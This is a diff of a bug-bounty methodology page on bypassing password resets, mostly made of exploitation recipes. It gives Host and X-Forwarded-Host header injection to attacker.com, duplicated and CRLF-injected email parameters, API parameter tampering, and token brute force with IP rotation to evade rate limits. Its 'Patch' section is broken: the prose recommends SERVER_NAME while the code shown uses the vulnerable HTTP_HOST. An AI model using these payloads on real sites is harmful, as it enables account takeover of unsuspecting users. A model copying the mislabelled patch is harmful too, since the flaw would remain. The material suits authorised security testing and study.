@@ -1,17 +1,246 @@
-# Reset/Forgoten Password Bypass
+# Reset/Forgotten Password Bypass
 
-## HTTP Headers
+The following techniques recompilation was taken from [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
 
-Sometimes in order to reset a password you contact an api endpoint and **send the email you want to reset the password**, like in the following example:
+## Password Reset Token Leak Via Referrer
 
-![](.gitbook/assets/1_6qc-agcjyzwmf8rgnvr_eg.png)
+The **HTTP referer** is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested. The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed ![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)
 
-The back-end may take the information present in the **Host header** and use it for the link where the token to reset the password is going to be sent.  
-For example, in this case if could send the reset password email to _something@gmail.com_ and set the token link to [https://bing.com/resetpasswd?token=12348rhfblrihvkurewfwu23](https://bing.com/resetpasswd?token=12348rhfblrihvkurewfwu23)
+### Exploitation
 
-Example from [https://medium.com/@abhishake100/password-reset-poisoning-to-ato-and-otp-bypass-1a3b0eba5491](https://medium.com/@abhishake100/password-reset-poisoning-to-ato-and-otp-bypass-1a3b0eba5491)
+* Request password reset to your email address
+* Click on the password reset link
+* Dont change password
+* Click any 3rd party websites\(eg: Facebook, twitter\)
+* Intercept the request in burpsuite proxy
+* Check if the referer header is leaking password reset token.
 
-In other occasions you can manage to obtain the **same** **results** modifying the domain used in the **Referer header like in** [**here**](https://medium.com/bugbountywriteup/fun-with-header-and-forget-password-without-that-nasty-twist-cbf45e5cc8db)**.**
+### Impact
 
-Or even adding the header **X-Forwarded-Host** you can be able to steal the reset password token from other accounts \(like [here](https://infosecwriteups.com/password-reset-token-leak-via-x-forwarded-host-4ed3e33dca31)\).
+It allows the person who has control of particular site to change the user’s password \(CSRF attack\), because this person knows reset password token of the user.
+
+### Reference:
+
+* https://hackerone.com/reports/342693
+* https://hackerone.com/reports/272379
+* https://hackerone.com/reports/737042
+* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
+* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1
+
+## Account Takeover Through Password Reset Poisoning
+
+If you find a host header attack and it’s out of scope, try to find the password reset button! 
+
+![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)
+
+### Exploitation
+
+* Intercept the password reset request in Burpsuite
+* Add following header or edit header in burpsuite\(try one by one\)
+
+```text
+Host: attacker.com
+```
+
+```text
+ Host: target.com
+ X-Forwarded-Host: attacker.com
+```
+
+```text
+ Host: target.com
+ Host: attacker.com
+```
+
+* Check if the link to change the password inside the email is pointing to attacker.com
+
+### Patch
+
+Use `$_SERVER['SERVER_NAME']` rather than `$_SERVER['HTTP_HOST']`
+
+```php
+$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
+```
+
+### Impact
+
+The victim will receive the malicious link in their email, and, when clicked, will leak the user’s password reset link / token to the attacker, leading to full account takeover.
+
+### Reference:
+
+* https://hackerone.com/reports/226659
+* https://hackerone.com/reports/167631
+* https://www.acunetix.com/blog/articles/password-reset-poisoning/
+* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
+* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87
+
+## Account Takeover: Password Reset With Manipualating Email Parameter
+
+### Exploitation
+
+* Add attacker email as second parameter using &
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com&email=attacker@email.com
+```
+
+* Add attacker email as second parameter using %20
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com%20email=attacker@email.com
+```
+
+* Add attacker email as second parameter using \|
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com|email=attacker@email.com
+```
+
+* Add attacker email as second parameter using cc
+
+```php
+POST /resetPassword
+[...]
+email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
+```
+
+* Add attacker email as second parameter using bcc
+
+```php
+POST /resetPassword
+[...]
+email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
+```
+
+* Add attacker email as second parameter using ,
+
+```php
+POST /resetPassword
+[...]
+email="victim@mail.tld",email="attacker@mail.tld"
+```
+
+* Add attacker email as second parameter in json array
+
+```php
+POST /resetPassword
+[...]
+{"email":["victim@mail.tld","atracker@mail.tld"]}
+```
+
+### Reference
+
+* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
+* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
+* https://twitter.com/HusseiN98D/status/1254888748216655872
+
+## Full Account Takeover via Changing Email And Password of any User through API Parameters
+
+### Exploitation
+
+* Attacker have to login with their account and Go to the Change password function
+* Start the Burp Suite and Intercept the request
+* After intercepting the request sent it to repeater and modify parameters Email and Password
+
+```php
+POST /api/changepass
+[...]
+("form": {"email":"victim@email.tld","password":"12345678"})
+```
+
+### Reference
+
+* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240
+
+### No Rate Limiting: Email Bombing <a id="5-no-rate-limiting-email-bombing"></a>
+
+![](https://www.howtogeek.com/thumbcache/2/200/5b21f5dc5ea2ab9cc8ec78b8cc2e437e/wp-content/uploads/2019/04/email-bomb.jpg)
+
+### Exploitation
+
+* Start the Burp Suite and Intercept the password reset request
+* Send to intruder
+* Use null payload
+
+### Reference
+
+* https://hackerone.com/reports/280534
+* https://hackerone.com/reports/794395
+
+## Find out How Password Reset Token is Generated
+
+Figure out the pattern of password reset token 
+
+![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg&usqp=CAU)
+
+If it
+
+* Generated based Timestamp
+* Generated based on the UserID
+* Generated based on email of User
+* Generated based on Firstname and Lastname
+* Generated based on Date of Birth
+* Generated based on Cryptography
+
+Use Burp Sequencer to find the randomness or predictability of tokens.
+
+## Response manipulation: Replace Bad Response With Good One
+
+Look for Request and Response like these
+
+```php
+HTTP/1.1 401 Unauthorized
+(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
+```
+
+Change Response
+
+```php
+HTTP/1.1 200 OK
+(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
+```
+
+### Reference
+
+* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3
+
+### Using Expired Token <a id="8-using-expired-token"></a>
+
+* Check if the expired token can be reused
+
+### Brute Force Password Rest token <a id="9-brute-force-password-rest-token"></a>
+
+Try to bruteforce the reset token using Burpsuite
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com&code=$BRUTE$
+```
+
+* Use IP-Rotator on burpsuite to bypass IP based ratelimit.
+
+### Reference
+
+* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1
+
+### Try Using Your Token <a id="10-try-using-your-token"></a>
+
+* Try adding your password reset token with victim’s Account
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com&code=$YOUR_TOKEN$
+```
+
+### Reference
+
+* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1
 
